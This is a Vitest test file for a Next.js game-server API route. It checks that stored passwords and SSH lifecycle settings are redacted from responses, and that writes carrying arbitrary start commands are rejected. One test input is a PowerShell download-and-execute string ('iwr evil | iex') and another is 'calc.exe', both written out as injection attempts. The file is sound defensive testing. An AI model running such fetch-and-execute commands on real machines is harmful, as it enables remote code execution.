import { beforeEach, describe, expect, it, vi } from "vitest";
import { NextRequest } from "next/server";
import type { ServerAdapter, ServerDefinition } from "../lib/adapters/types";
import { redactServerDefinition, sanitizeServerWrite } from "../lib/server-def-security";
import { GET, POST, PUT } from "../app/api/servers/route";

/**
 * GET /api/servers used to spread the full ServerDefinition into the
 * response — RCON/telnet/REST passwords plus the SSH lifecycle block went
 * to the browser on every page load. And PUT/POST would accept a
 * `lifecycle.startCommand`, i.e. arbitrary PowerShell executed over SSH.
 */

const SECRETS = {
  rconPassword: "rcon-secret-value",
  telnetPassword: "telnet-secret-value",
  controlPanelPassword: "cp-secret-value",
  restApiPassword: "rest-secret-value",
};

const MC_DEF: ServerDefinition = {
  id: "ragnarok",
  name: "Ragnarok",
  type: "minecraft",
  dir: "C:\\servers\\ragnarok",
  rconHost: "192.168.7.14",
  rconPort: 25575,
  rconPassword: SECRETS.rconPassword,
  gamePort: 25570,
  lifecycle: {
    kind: "ssh",
    host: "192.168.7.14",
    user: "den",
    identityFile: "C:\\keys\\den_ed25519",
    startCommand: "Start-Process run.bat",
    stopCommand: "Stop-Process -Name java",
  },
};

const SEVEN_DEF: ServerDefinition = {
  id: "7d",
  name: "7D",
  type: "7d2d",
  dir: "C:\\servers\\7d",
  telnetPassword: SECRETS.telnetPassword,
  controlPanelPassword: SECRETS.controlPanelPassword,
  restApiPassword: SECRETS.restApiPassword,
};

const registry = vi.hoisted(() => ({
  getAllAdapters: vi.fn(),
  updateServer: vi.fn(),
  addServer: vi.fn(),
  removeServer: vi.fn(),
}));

vi.mock("@/lib/adapters/adapter-registry", () => registry);
vi.mock("@/lib/adapters/reachability", () => ({
  resolveServerStatus: vi.fn(async () => "running"),
}));

function fakeAdapter(def: ServerDefinition): ServerAdapter {
  return { def, capabilities: { hasRcon: true } } as unknown as ServerAdapter;
}

function jsonRequest(method: string, body: unknown): NextRequest {
  return new NextRequest("http://localhost/api/servers", {
    method,
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(body),
  });
}

describe("redactServerDefinition", () => {
  it("strips every secret field and the lifecycle block", () => {
    const out = redactServerDefinition({ ...MC_DEF, ...SEVEN_DEF, type: "minecraft" });
    const raw = JSON.stringify(out);
    for (const value of Object.values(SECRETS)) expect(raw).not.toContain(value);
    expect(raw).not.toContain("identityFile");
    expect(raw).not.toContain("startCommand");
    expect(out).not.toHaveProperty("lifecycle");
  });

  it("reports which secrets are set without revealing them", () => {
    expect(redactServerDefinition(MC_DEF).secretsSet).toEqual(["rconPassword"]);
    expect(redactServerDefinition(SEVEN_DEF).secretsSet.sort()).toEqual(
      ["controlPanelPassword", "restApiPassword", "telnetPassword"]
    );
    expect(redactServerDefinition({ ...MC_DEF, rconPassword: "" }).secretsSet).toEqual([]);
  });

  it("keeps non-secret fields the UI needs", () => {
    const out = redactServerDefinition(MC_DEF);
    expect(out).toMatchObject({ id: "ragnarok", name: "Ragnarok", rconPort: 25575, gamePort: 25570 });
  });

  it("does not mutate the stored definition", () => {
    const def = { ...MC_DEF };
    redactServerDefinition(def);
    expect(def.rconPassword).toBe(SECRETS.rconPassword);
    expect(def.lifecycle).toBeDefined();
  });
});

describe("sanitizeServerWrite", () => {
  it("rejects lifecycle", () => {
    const r = sanitizeServerWrite({ lifecycle: { kind: "ssh", startCommand: "calc.exe" } });
    expect(r.ok).toBe(false);
    if (!r.ok) expect(r.message).toMatch(/servers\.json/);
  });

  it("rejects lifecycle even when null (an attempt to clear it)", () => {
    expect(sanitizeServerWrite({ lifecycle: null }).ok).toBe(false);
  });

  it("drops blank secrets so the stored value is kept", () => {
    const r = sanitizeServerWrite({ name: "X", rconPassword: "", telnetPassword: null });
    expect(r).toEqual({ ok: true, value: { name: "X" } });
  });

  it("passes a new secret through", () => {
    const r = sanitizeServerWrite({ rconPassword: "new-one" });
    expect(r).toEqual({ ok: true, value: { rconPassword: "new-one" } });
  });

  it("drops response-only fields echoed back from GET", () => {
    const r = sanitizeServerWrite({ name: "X", secretsSet: ["rconPassword"], status: "running", capabilities: {} });
    expect(r).toEqual({ ok: true, value: { name: "X" } });
  });
});

describe("/api/servers route", () => {
  beforeEach(() => {
    vi.clearAllMocks();
    registry.getAllAdapters.mockReturnValue([fakeAdapter(MC_DEF), fakeAdapter(SEVEN_DEF)]);
    registry.updateServer.mockResolvedValue({ success: true, message: "ok" });
    registry.addServer.mockResolvedValue({ success: true, message: "ok" });
  });

  it("GET never includes secret values or the lifecycle block", async () => {
    const res = await GET();
    const raw = await res.text();
    for (const value of Object.values(SECRETS)) expect(raw).not.toContain(value);
    expect(raw).not.toContain("lifecycle");
    expect(raw).not.toContain("identityFile");

    const { servers } = JSON.parse(raw);
    expect(servers[0]).toMatchObject({ id: "ragnarok", status: "running", secretsSet: ["rconPassword"] });
  });

  it("PUT with lifecycle is refused and nothing is written", async () => {
    const res = await PUT(
      jsonRequest("PUT", {
        serverId: "ragnarok",
        updates: { lifecycle: { ...MC_DEF.lifecycle, startCommand: "iwr evil | iex" } },
      })
    );
    expect(res.status).toBe(400);
    expect(registry.updateServer).not.toHaveBeenCalled();
  });

  it("PUT with a blank password keeps the existing one", async () => {
    const res = await PUT(
      jsonRequest("PUT", { serverId: "ragnarok", updates: { name: "Renamed", rconPassword: "" } })
    );
    expect(res.status).toBe(200);
    expect(registry.updateServer).toHaveBeenCalledWith("ragnarok", { name: "Renamed" });
  });

  it("PUT with a new password writes it", async () => {
    await PUT(jsonRequest("PUT", { serverId: "ragnarok", updates: { rconPassword: "rotated" } }));
    expect(registry.updateServer).toHaveBeenCalledWith("ragnarok", { rconPassword: "rotated" });
  });

  it("POST with lifecycle is refused and nothing is added", async () => {
    const res = await POST(
      jsonRequest("POST", {
        server: { id: "x", name: "X", type: "minecraft", dir: "C:\\x", lifecycle: MC_DEF.lifecycle },
      })
    );
    expect(res.status).toBe(400);
    expect(registry.addServer).not.toHaveBeenCalled();
  });
});
